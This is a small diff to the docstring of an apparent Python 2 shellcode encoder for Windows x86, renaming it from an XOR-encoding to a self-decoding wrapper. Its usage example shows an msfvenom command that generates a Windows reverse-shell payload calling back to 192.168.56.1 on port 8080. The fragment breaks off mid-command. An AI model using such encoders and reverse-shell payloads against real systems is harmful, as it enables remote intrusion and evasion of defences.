@@ -1,7 +1,7 @@
 #!/usr/bin/env python2
 
 """
-Vigenere-based XOR encoding shellcode wrapper for Windows x86-32 (works fine on x86-64)
+Vigenere-based self-decoding shellcode wrapper for Windows x86-32 (works fine on x86-64)
 
 Example:
 $ msfvenom -p windows/shell_reverse_tcp -f raw -b '\\x00\\xff' LHOST=192.168.56.1 LPORT=8080 \
